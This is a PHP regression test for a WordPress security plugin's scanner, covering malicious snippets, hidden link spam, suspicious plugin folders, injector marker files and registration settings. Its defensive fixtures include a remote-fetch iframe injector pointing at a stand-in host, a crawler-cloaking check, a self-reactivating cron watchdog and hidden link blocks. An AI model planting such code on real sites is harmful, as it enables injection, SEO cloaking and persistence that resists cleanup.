<?php
/**
 * Regression test for the checks added after the October 2026 incident review (1.4.148).
 *
 * Run from the command line only:  php tests/test-incident-response.php
 *
 * Synthetic fixtures only. Covers: open registration with a privileged default
 * role closed automatically; malicious code in the Code Snippets table and
 * WPCode posts; hidden link blocks in post content; hidden folders and
 * random-suffix folders in the plugins folder; incident marker tokens; the
 * wp-config alert logged once per hash; the persistent withheld-removal
 * notice; and how an actor authenticated.
 */
if ( PHP_SAPI !== 'cli' ) {
	exit( 1 );
}

$tmp = sys_get_temp_dir() . '/wps-inc-' . bin2hex( random_bytes( 4 ) );
mkdir( $tmp . '/plugins/wps-self', 0777, true );
mkdir( $tmp . '/mu-plugins', 0777, true );
mkdir( $tmp . '/site', 0777, true );
define( 'ABSPATH', $tmp . '/site/' );
define( 'WPS_DIR', $tmp . '/plugins/wps-self/' );
define( 'WPS_OPTION', 'wps_opts' );
define( 'WP_PLUGIN_DIR', $tmp . '/plugins' );
define( 'WPMU_PLUGIN_DIR', $tmp . '/mu-plugins' );
define( 'WP_CONTENT_DIR', $tmp );
define( 'MINUTE_IN_SECONDS', 60 );
define( 'HOUR_IN_SECONDS', 3600 );
define( 'DAY_IN_SECONDS', 86400 );
define( 'ARRAY_A', 'ARRAY_A' );
$GLOBALS['opts']     = [ 'quarantine_enabled' => '0' ];
$GLOBALS['options']  = [];
$GLOBALS['updates']  = [];
$GLOBALS['crons']    = [];
$GLOBALS['cleared']  = [];
$GLOBALS['transients'] = [];
function get_option( $k, $d = false ) {
	if ( 'wps_opts' === $k ) {
		return $GLOBALS['opts'];
	}
	return array_key_exists( $k, $GLOBALS['options'] ) ? $GLOBALS['options'][ $k ] : $d;
}
function update_option( $k, $v ) { $GLOBALS['updates'][] = $k; $GLOBALS['options'][ $k ] = $v; return true; }
function delete_option( $k ) { unset( $GLOBALS['options'][ $k ] ); return true; }
function apply_filters( $t, $v ) { return $v; }
function wp_json_encode( $v ) { return json_encode( $v ); }
function _get_cron_array() { return $GLOBALS['crons']; }
function wp_clear_scheduled_hook( $h ) { $GLOBALS['cleared'][] = $h; }
function get_transient( $k = '' ) { return $GLOBALS['transients'][ $k ] ?? ( $GLOBALS['transients']['*'] ?? false ); }
function set_transient() { return true; }
function delete_transient() { return true; }
function wp_upload_dir() { return [ 'basedir' => WP_CONTENT_DIR . '/uploads', 'baseurl' => '/', 'error' => false ]; }
function add_action() {}
function add_filter() {}
function content_url() { return ''; }
function get_theme_root() { return ABSPATH; }
function get_template_directory() { return ABSPATH; }
function get_stylesheet_directory() { return ABSPATH; }
function wp_normalize_path( $p ) { return str_replace( '\\', '/', $p ); }
function current_user_can() { return true; }
function esc_html( $s ) { return htmlspecialchars( (string) $s, ENT_QUOTES ); }
class WPS_Stub_Wpdb {
	public $prefix = 'wp_';
	public $posts  = 'wp_posts';
	public $snippets = [];
	public $wpcode   = [];
	public $updated  = [];
	public function esc_like( $s ) { return $s; }
	public function prepare( $sql, ...$a ) { return $sql . '|' . implode( ',', $a ); }
	public function get_var( $q ) { return false !== strpos( $q, 'wp_snippets' ) ? 'wp_snippets' : null; }
	public function get_results( $q, $o = null ) {
		if ( false !== strpos( $q, 'FROM `wp_snippets`' ) ) {
			return $this->snippets;
		}
		if ( false !== strpos( $q, "post_type = 'wpcode'" ) ) {
			return $this->wpcode;
		}
		return [];
	}
	public function update( $t, $d, $w ) { $this->updated[] = [ $t, $d, $w ]; return 1; }
}
$wpdb = new WPS_Stub_Wpdb();
$GLOBALS['wpdb'] = $wpdb;
class WPS_Logger {
	public static $events = [];
	public static function log_event( $t, $s = '', $ip = '' ) { self::$events[] = $t; }
	public static function write( $m ) {}
}
foreach ( glob( dirname( __DIR__ ) . '/includes/class-*.php' ) as $f ) {
	if ( false === strpos( $f, 'blocker' ) && false === strpos( $f, 'class-admin-' ) && false === strpos( $f, 'class-logger' ) && false === strpos( $f, 'class-event-log' ) ) {
		require_once $f;
	}
}

$fail = 0;
function check( string $name, bool $ok, string $detail = '' ): void {
	global $fail;
	echo ( $ok ? 'PASS ' : 'FAIL ' ) . $name . ( $ok ? '' : ' :: ' . $detail ) . "\n";
	if ( ! $ok ) {
		++$fail;
	}
}
function put( string $p, string $c ): void {
	@mkdir( dirname( $p ), 0777, true );
	file_put_contents( $p, $c );
}
function run( string $method ): array {
	$m = new ReflectionMethod( 'WPS_Scanner', $method );
	$m->setAccessible( true );
	return $m->invoke( null );
}
function reset_state(): void {
	$GLOBALS['options'] = [];
	$GLOBALS['updates'] = [];
	$GLOBALS['cleared'] = [];
	$GLOBALS['crons']   = [];
	$GLOBALS['opts']    = [ 'quarantine_enabled' => '0' ];
}

// ---- registration with a privileged default role
reset_state();
$GLOBALS['options'] = [ 'users_can_register' => 1, 'default_role' => 'administrator' ];
$f = run( 'check_registration_settings' );
check( 'open registration with an administrator default role is closed automatically', $f && ! empty( $f[0]['remediated'] ) && 0 === $GLOBALS['options']['users_can_register'] && 'subscriber' === $GLOBALS['options']['default_role'], json_encode( $GLOBALS['options'] ) );
check( 'and the finding says what it was, so it can be undone', false !== strpos( $f[0]['action'], 'CLOSED AUTOMATICALLY' ) && false !== strpos( $f[0]['action'], 'administrator' ) );
reset_state();
$GLOBALS['options'] = [ 'users_can_register' => 1, 'default_role' => 'editor' ];
run( 'check_registration_settings' );
check( 'an editor default role with open registration is closed too', 'subscriber' === $GLOBALS['options']['default_role'] );
reset_state();
$GLOBALS['options'] = [ 'users_can_register' => 1, 'default_role' => 'subscriber' ];
run( 'check_registration_settings' );
check( 'open registration with the ordinary role is left alone', 1 === $GLOBALS['options']['users_can_register'] && 'subscriber' === $GLOBALS['options']['default_role'] );
reset_state();
$GLOBALS['options'] = [ 'users_can_register' => 0, 'default_role' => 'administrator' ];
$f = run( 'check_registration_settings' );
check( 'a privileged default role with registration closed is reported and not changed', $f && empty( $f[0]['remediated'] ) && 'administrator' === $GLOBALS['options']['default_role'] );
reset_state();
$GLOBALS['opts']    = [ 'quarantine_enabled' => '0', 'auto_delete_enabled' => '0' ];
$GLOBALS['options'] = [ 'users_can_register' => 1, 'default_role' => 'administrator' ];
$f = run( 'check_registration_settings' );
check( 'with Auto-delete off it is reported and nothing is changed', $f && empty( $f[0]['remediated'] ) && 1 === $GLOBALS['options']['users_can_register'] );

// ---- snippet stores
reset_state();
$evil_iframe = "add_action('wp_footer', function () { \$r = wp_remote_get('https://cdn.example.invalid/page.html'); echo '<iframe srcdoc=\"' . esc_attr(wp_remote_retrieve_body(\$r)) . '\"></iframe>'; });";
$evil_bot    = "if (preg_match('/googlebot|bingbot/i', \$_SERVER['HTTP_USER_AGENT'])) { echo 'x'; }";
$evil_dog    = "add_action('wd_restore_hook', function () { if (!is_plugin_active('x/x.php')) { activate_plugin('x/x.php'); } }); if (!wp_next_scheduled('wd_restore_hook')) { wp_schedule_event(time(), 'hourly', 'wd_restore_hook'); }";
$fine_fetch  = "\$r = wp_remote_get('https://api.example.com/rates.json'); \$d = json_decode(wp_remote_retrieve_body(\$r), true); add_shortcode('rate', function () use (\$d) { return esc_html(\$d['usd']); });";
$fine_cron   = "add_action('my_nightly_cleanup', 'my_cleanup'); if (!wp_next_scheduled('my_nightly_cleanup')) { wp_schedule_event(time(), 'daily', 'my_nightly_cleanup'); }";
$wpdb->snippets = [
	[ 'id' => 7, 'name' => 'Footer helper', 'code' => $evil_iframe, 'active' => 1 ],
	[ 'id' => 8, 'name' => 'Bot check', 'code' => $evil_bot, 'active' => 1 ],
	[ 'id' => 9, 'name' => 'Watchdog', 'code' => $evil_dog, 'active' => 1 ],
	[ 'id' => 10, 'name' => 'Exchange rate', 'code' => $fine_fetch, 'active' => 1 ],
	[ 'id' => 11, 'name' => 'Nightly cleanup', 'code' => $fine_cron, 'active' => 1 ],
	[ 'id' => 12, 'name' => 'Old bot check', 'code' => $evil_bot, 'active' => 0 ],
];
$wpdb->wpcode = [ [ 'ID' => 55, 'post_title' => 'Header script', 'post_content' => $evil_iframe, 'post_status' => 'publish' ] ];
$GLOBALS['crons'] = [ 1 => [ 'wd_restore_hook' => [ 'k' => [] ], 'my_nightly_cleanup' => [ 'k' => [] ] ] ];
$f  = run( 'check_snippet_store_malware' );
$by = [];
foreach ( $f as $x ) {
	$by[ strtok( $x['subject'], ' ' ) . strtok( ' ' ) ] = $x;
}
check( 'the iframe fetcher, the crawler test and the watchdog are found in the Code Snippets table', isset( $by['CodeSnippets'] ) || 3 <= count( array_filter( $f, static fn( $x ) => 0 === strpos( $x['subject'], 'Code Snippets #' ) ) ), implode( ' | ', array_map( static fn( $x ) => $x['subject'], $f ) ) );
check( 'a WPCode post with the same code is found', 1 === count( array_filter( $f, static fn( $x ) => 0 === strpos( $x['subject'], 'WPCode #55' ) ) ) );
check( 'an ordinary fetch-and-display snippet and an ordinary scheduled task are not', 0 === count( array_filter( $f, static fn( $x ) => false !== strpos( $x['subject'], '#10 ' ) || false !== strpos( $x['subject'], '#11 ' ) ) ) );
$ids = array_map( static fn( $u ) => $u[2]['id'] ?? ( $u[2]['ID'] ?? 0 ), $wpdb->updated );
check( 'the active malicious snippets are switched off, not deleted', in_array( 7, $ids, true ) && in_array( 8, $ids, true ) && in_array( 9, $ids, true ) && in_array( 55, $ids, true ) && ! in_array( 10, $ids, true ) && ! in_array( 11, $ids, true ) && ! in_array( 12, $ids, true ), json_encode( $ids ) );
check( 'switching off sets active to 0, and a WPCode post to draft', 0 === ( $wpdb->updated[0][1]['active'] ?? 1 ) && 'draft' === ( array_values( array_filter( $wpdb->updated, static fn( $u ) => 55 === ( $u[2]['ID'] ?? 0 ) ) )[0][1]['post_status'] ?? '' ) );
check( 'the cron event the watchdog registered is cleared and the unrelated one is not', in_array( 'wd_restore_hook', $GLOBALS['cleared'], true ) && ! in_array( 'my_nightly_cleanup', $GLOBALS['cleared'], true ), json_encode( $GLOBALS['cleared'] ) );
check( 'each finding carries the SQL to delete the row for review', false !== strpos( (string) ( $f[0]['sql'] ?? '' ), 'DELETE FROM' ) );
$wpdb->updated = [];
$GLOBALS['cleared'] = [];
$GLOBALS['opts'] = [ 'quarantine_enabled' => '0', 'auto_delete_enabled' => '0' ];
$f = run( 'check_snippet_store_malware' );
check( 'with Auto-delete off the snippets are reported and left running', count( $f ) >= 4 && ! $wpdb->updated && ! $GLOBALS['cleared'] );
$wpdb->snippets = [];
$wpdb->wpcode   = [];
check( 'no snippet tables, no findings', [] === run( 'check_snippet_store_malware' ) );
check( 'snippet_malware_reasons is empty for plain code', [] === WPS_Scanner::snippet_malware_reasons( 'add_filter("body_class", function ($c) { $c[] = "x"; return $c; });' ) );

// ---- hidden link blocks in content
$blk = static fn( int $n, string $style ) => '<div ' . $style . '>' . str_repeat( '<a href="https://spam.example.invalid/x">link</a> ', $n ) . '</div>';
check( 'a data-seo-links-block marker is spam on its own', WPS_Spam_Signatures::evaluate( '<div data-seo-links-block>' . '<a href="https://x.invalid">a</a></div>' )['spam'] );
check( 'six links in a clipped, one-pixel block are spam', WPS_Spam_Signatures::evaluate( $blk( 6, 'style="position:absolute;width:1px;height:1px;clip:rect(0,0,0,0)"' ) )['spam'] );
check( 'six links off-screen at left:-9999px are spam', WPS_Spam_Signatures::evaluate( $blk( 6, 'style="left:-9999px"' ) )['spam'] );
check( 'six links in a display:none accordion are not', ! WPS_Spam_Signatures::evaluate( $blk( 6, 'style="display:none"' ) )['spam'] );
check( 'two links in a clipped block are not', ! WPS_Spam_Signatures::evaluate( $blk( 2, 'style="clip:rect(0,0,0,0)"' ) )['spam'] );

// ---- plugin folders
reset_state();
$P = $tmp . '/plugins';
put( $P . '/seo-by-rank-math/vendor/donatj/phpuseragentparser/.helpers/loader.php', "<?php\n// x\n" );
put( $P . '/seo-by-rank-math/.github/workflows/ci.yml', "name: ci\n" );
put( $P . '/seo-by-rank-math/.github/helper.php', "<?php\n" );
put( $P . '/other/.cache/data.json', '{}' );
put( $P . '/other/.hidden-empty/readme.txt', 'x' );
$f  = run( 'check_plugin_dot_directories' );
$sj = implode( ' | ', array_map( static fn( $x ) => $x['subject'], $f ) );
check( 'a hidden folder holding PHP inside a plugin is reported, and nothing is removed', 1 === count( $f ) && false !== strpos( $sj, '.helpers' ) && empty( $f[0]['auto_delete'] ), $sj );
check( 'tooling folders and hidden folders with no code are left alone', false === strpos( $sj, '.github' ) && false === strpos( $sj, '.cache' ) && false === strpos( $sj, '.hidden-empty' ), $sj );
foreach ( [ 'smart-seo-analytics-f08f', 'cloud-seo-checker-2fb8', 'plugin-name-2024', 'my-plugin', 'wp-cli-1.2.3', 'abc-0420' ] as $n ) {
	put( $P . '/' . $n . '/' . $n . '.php', "<?php\n/* Plugin Name: X */\n" );
}
$f  = run( 'check_random_suffix_plugin_folders' );
$sj = implode( ' | ', array_map( static fn( $x ) => basename( $x['path'] ), $f ) );
check( 'folders ending in a four-character hex suffix are reported, report only', false !== strpos( $sj, 'smart-seo-analytics-f08f' ) && false !== strpos( $sj, 'cloud-seo-checker-2fb8' ) && false !== strpos( $sj, 'abc-0420' ) && empty( $f[0]['auto_delete'] ), $sj );
check( 'a year suffix and ordinary names are not', false === strpos( $sj, '2024' ) && false === strpos( $sj, 'my-plugin' ) && false === strpos( $sj, 'wp-cli' ), $sj );

// ---- incident markers
put( $tmp . '/mu-plugins/vitrina.php', "<?php\ndefine('WM_CUSTOM_FILTERS_LOADED', true);\n" );
put( $P . '/inject/inject.php', "<?php\n/* Plugin Name: Inject */\n\$s = 'vitrina-managed';\n" . str_repeat( "function pad_z() { return 1; }\n", 600 ) );
put( $P . '/clean/clean.php', "<?php\n/* Plugin Name: Clean */\nfunction c() { return 'vitrina'; }\n" );
$f  = run( 'check_incident_markers' );
$by = [];
foreach ( $f as $x ) {
	$by[ basename( $x['path'] ) ] = $x;
}
check( 'a dropped file carrying a marker is removable', ! empty( $by['vitrina.php']['auto_delete'] ) && 'File carrying a known injector marker' === $by['vitrina.php']['type'] );
check( 'a marker inside a large plugin file is reported only', isset( $by['inject.php'] ) && empty( $by['inject.php']['auto_delete'] ) );
check( 'a file with a similar word but not the marker is quiet', ! isset( $by['clean.php'] ) );
check( 'the removal policy allows the dropped file', WPS_Remediation_Policy::decide( $by['vitrina.php'] )['allowed'], json_encode( WPS_Remediation_Policy::decide( $by['vitrina.php'] ) ) );

// ---- wp-config alert once per hash
reset_state();
put( ABSPATH . 'wp-config.php', "<?php\n// config A\n" );
run( 'check_wp_config_integrity' ); // baseline
put( ABSPATH . 'wp-config.php', "<?php\n// config B\n" );
run( 'check_wp_config_integrity' );
$first = count( array_keys( $GLOBALS['updates'], 'wps_wpconfig_alerted', true ) );
run( 'check_wp_config_integrity' );
run( 'check_wp_config_integrity' );
$again = count( array_keys( $GLOBALS['updates'], 'wps_wpconfig_alerted', true ) );
check( 'the modified-config alert is recorded once for one hash, though the finding repeats', 1 === $first && 1 === $again && 1 === count( run( 'check_wp_config_integrity' ) ), $first . '/' . $again );
put( ABSPATH . 'wp-config.php', "<?php\n// config C\n" );
run( 'check_wp_config_integrity' );
check( 'a new hash alerts again', 2 === count( array_keys( $GLOBALS['updates'], 'wps_wpconfig_alerted', true ) ) );

// ---- withheld removal notice
reset_state();
$gone = $tmp . '/plugins/live-threat.php';
put( $gone, "<?php\n" );
$nm = new ReflectionMethod( 'WPS_Scanner', 'note_withheld_remediation' );
$nm->setAccessible( true );
$nm->invoke( null, $gone, 'Known malware upload' );
$nm->invoke( null, $tmp . '/plugins/already-gone.php', 'Known malware upload' );
$w = WPS_Scanner::withheld_remediations();
check( 'a withheld removal is remembered while the file exists and dropped once it does not', isset( $w[ $gone ] ) && 1 === count( $w ), json_encode( array_keys( $w ) ) );
$src = (string) file_get_contents( dirname( __DIR__ ) . '/includes/class-admin.php' );
check( 'the admin class hooks a notice on admin and network admin screens and uses no inline style', false !== strpos( $src, "'admin_notices', [ __CLASS__, 'render_withheld_notice' ]" ) && false !== strpos( $src, "'network_admin_notices', [ __CLASS__, 'render_withheld_notice' ]" ) && false === strpos( substr( $src, (int) strpos( $src, 'function render_withheld_notice' ), 2500 ), 'style=' ) );
unlink( $gone );
check( 'once the file is gone the list is empty', [] === WPS_Scanner::withheld_remediations() );

// ---- how an actor authenticated
WPS_Edr::on_app_password_auth( null, [ 'name' => 'PBN Automation' ] );
check( 'a request that authenticated with an application password says so, by name', 'application password "PBN Automation"' === WPS_Edr::auth_method(), WPS_Edr::auth_method() );
$esrc = (string) file_get_contents( dirname( __DIR__ ) . '/includes/class-edr.php' );
check( 'the audit hooks include the application-password and password-reset events', false !== strpos( $esrc, "'wp_create_application_password'" ) && false !== strpos( $esrc, "'application_password_did_authenticate'" ) && false !== strpos( $esrc, "'retrieve_password'" ) );

// ---- scan fairness: what was skipped last time runs first
$cks = [ 'a' => 1, 'b' => 2, 'c' => 3, 'd' => 4, 'e' => 5 ];
check( 'with nothing carried over the order is unchanged', array_keys( WPS_Scanner::order_checks_for_fairness( $cks, [] ) ) === [ 'a', 'b', 'c', 'd', 'e' ] );
check( 'the skipped checks move to the front, keeping their own order, and the rest follow', array_keys( WPS_Scanner::order_checks_for_fairness( $cks, [ 'd', 'b' ] ) ) === [ 'b', 'd', 'a', 'c', 'e' ] );
check( 'a label that is no longer a check is ignored and nothing is lost', array_keys( WPS_Scanner::order_checks_for_fairness( $cks, [ 'gone', 'e' ] ) ) === [ 'e', 'a', 'b', 'c', 'd' ] );
$ssrc = (string) file_get_contents( dirname( __DIR__ ) . '/includes/class-scanner.php' );
check( 'the scan reads and writes the carry-over', false !== strpos( $ssrc, "get_option( 'wps_scan_carryover'" ) && false !== strpos( $ssrc, "update_option( 'wps_scan_carryover'" ) );
// Simulate: a budget that fits 3 of 5 checks. Without rotation d and e never run; with it they run on the second scan.
$ran  = [];
$carry = [];
for ( $scan = 1; $scan <= 3; $scan++ ) {
	$order = WPS_Scanner::order_checks_for_fairness( $cks, $carry );
	$carry = [];
	$n     = 0;
	foreach ( array_keys( $order ) as $label ) {
		if ( ++$n > 3 ) {
			$carry[] = $label;
			continue;
		}
		$ran[ $label ] = ( $ran[ $label ] ?? 0 ) + 1;
	}
}
check( 'with a budget that fits 3 of 5 checks every check runs within three scans', 5 === count( $ran ), json_encode( $ran ) );

// ---- stock core files are not reported as obfuscated
$GLOBALS['wp_version'] = '6.8.1';
$lines = '';
for ( $i = 0; $i < 40; $i++ ) {
	$lines .= "\$v$i = 'ab'.'cd'.'ef';\n";
}
$core = ABSPATH . 'wp-includes/deprecated.php';
put( $core, "<?php\n" . $lines );
$other = ABSPATH . 'wp-includes/other.php';
put( $other, "<?php\n" . $lines );
$GLOBALS['transients'] = [];
$f = run( 'check_split_literal_obfuscation' );
check( 'with no manifest a split-literal core file is still reported (unknown is not stock)', 2 <= count( $f ), (string) count( $f ) );
$GLOBALS['transients']['*'] = [ 'wp-includes/deprecated.php' => sha1_file( $core ), 'wp-includes/other.php' => str_repeat( 'a', 40 ) ];
$sj = implode( ' | ', array_map( static fn( $x ) => $x['subject'], run( 'check_split_literal_obfuscation' ) ) );
check( 'a core file that matches the official hash is not reported', false === strpos( $sj, 'deprecated.php' ), $sj );
check( 'a core file that does not match the manifest still is', false !== strpos( $sj, 'other.php' ), $sj );
$GLOBALS['transients'] = [];

// ---- host agent and the three smaller edits
$fsrc = (string) file_get_contents( dirname( __DIR__ ) . '/includes/class-forensics.php' );
check( 'the Monarx agent path is a safe auto_prepend_file target', false !== strpos( $fsrc, "'/var/lib/monarx-agent/'" ) );
check( 'the new file checks are registered', 4 <= preg_match_all( "/'check_(?:snippet_store_malware|plugin_dot_directories|random_suffix_plugin_folders|incident_markers)' => \\[ __CLASS__/", (string) file_get_contents( dirname( __DIR__ ) . '/includes/class-scanner.php' ) ) );

exec( 'rm -rf ' . escapeshellarg( $tmp ) );
echo $fail ? "\n$fail FAILED\n" : "\nAll passed\n";
exit( $fail ? 1 : 0 );
